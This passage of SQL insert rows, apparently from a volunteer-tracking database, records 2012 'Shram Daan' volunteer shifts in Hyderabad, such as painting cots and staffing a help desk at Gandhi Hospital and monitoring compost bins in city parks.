(566, '223', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(567, '236', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(568, '243', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(569, '239', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(570, '240', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(571, '238', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(572, '237', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(573, '241', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(574, '242', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(575, '181', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(576, '169', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(577, '244', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Francis  College for Women', '', 12),
(578, '245', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Francis  College for Women', '', 12),
(579, '246', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Francis  College for Women', '', 12),
(580, '247', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Indian Institute of Management and Commerce', '', 12),
(581, '248', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', '', '', 12),
(582, '249', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Stanley College of Engineering and Tech for Women', '', 12),
(583, '250', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Malla Reddy College Of Engineering', '', 12),
(584, '251', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Nobel College of Engineering', '', 12),
(585, '252', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Pious Degree College', '', 12),
(586, '253', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Vishnu Sree Institute of Technology and Engineering', '', 12),
(587, '254', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Pious Degree College', '', 12),
(588, '255', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', '', '', 12),
(589, '256', '2012-07-21', '2012-07-21', '12:00:00', '16:30:00', '3', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Pious Degree College', '', 12),
(590, '256', '2012-07-28', '2012-07-28', '10:30:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'St.Pious Degree College', '', 12),
(591, '253', '2012-07-28', '2012-07-28', '10:30:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'Vishnu Sree Institute of Technology and Engineering', '', 12),
(592, '255', '2012-07-28', '2012-07-28', '10:30:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', '', '', 12),
(593, '257', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(594, '258', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(595, '259', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(596, '198', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(597, '174', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(598, '171', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(599, '170', '2012-07-27', '2012-07-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(600, '257', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(601, '258', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(602, '259', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(603, '198', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(604, '174', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(605, '176', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(606, '171', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(607, '260', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(608, '170', '2012-07-28', '2012-07-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(609, '174', '2012-07-29', '2012-07-29', '09:00:00', '17:00:00', '8', 'Shram Daan', 'Environment', 'Monthly waste donation camp at Gachbowli', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(610, '219', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(611, '220', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(612, '218', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(613, '223', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(614, '174', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(615, '171', '2012-07-30', '2012-07-30', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(616, '170', '2012-07-30', '2012-07-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(617, '231', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(618, '261', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(619, '234', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(620, '233', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(621, '235', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(622, '219', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(623, '220', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(624, '218', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(625, '222', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(626, '223', '2012-07-31', '2012-07-31', '09:30:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(627, '262', '2012-07-31', '2012-07-31', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(628, '263', '2012-07-31', '2012-07-31', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(629, '262', '2012-07-25', '2012-07-25', '10:00:00', '11:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(630, '263', '2012-07-25', '2012-07-25', '10:00:00', '11:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(631, '262', '2012-07-21', '2012-07-21', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(632, '263', '2012-07-21', '2012-07-21', '09:30:00', '11:30:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(633, '262', '2012-07-10', '2012-07-10', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(634, '263', '2012-07-10', '2012-07-10', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(635, '264', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(636, '265', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(637, '212', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(638, '266', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(639, '267', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(640, '268', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(641, '235', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(642, '231', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(643, '234', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(644, '261', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(645, '233', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(646, '229', '2012-08-01', '2012-08-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(647, '265', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(648, '212', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(649, '266', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(650, '267', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(651, '268', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(652, '272', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(653, '271', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(654, '269', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(655, '270', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(656, '176', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(657, '197', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(658, '202', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(659, '169', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(660, '273', '2012-08-02', '2012-08-02', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(661, '198', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(662, '199', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(663, '257', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(664, '258', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(665, '259', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(666, '274', '2012-08-03', '2012-08-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(667, '198', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(668, '199', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(669, '257', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(670, '258', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(671, '259', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(672, '274', '2012-08-04', '2012-08-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(673, '264', '2012-08-06', '2012-08-06', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(674, '265', '2012-08-06', '2012-08-06', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(675, '220', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(676, '218', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(677, '233', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(678, '223', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(679, '222', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(680, '235', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(681, '231', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(682, '275', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(683, '263', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(684, '262', '2012-08-06', '2012-08-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(685, '275', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(686, '276', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(687, '277', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(688, '278', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(689, '279', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(690, '273', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(691, '169', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(692, '265', '2012-08-07', '2012-08-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(693, '171', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(694, '204', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(695, '174', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(696, '280', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(697, '281', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(698, '282', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(699, '283', '2012-08-08', '2012-08-08', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(700, '284', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(701, '176', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(702, '273', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(703, '202', '2012-08-09', '2012-08-09', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(704, '169', '2012-08-09', '2012-08-09', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(705, '171', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(706, '204', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(707, '174', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(708, '280', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(709, '281', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(710, '282', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(711, '283', '2012-08-09', '2012-08-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(712, '257', '2012-08-10', '2012-08-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
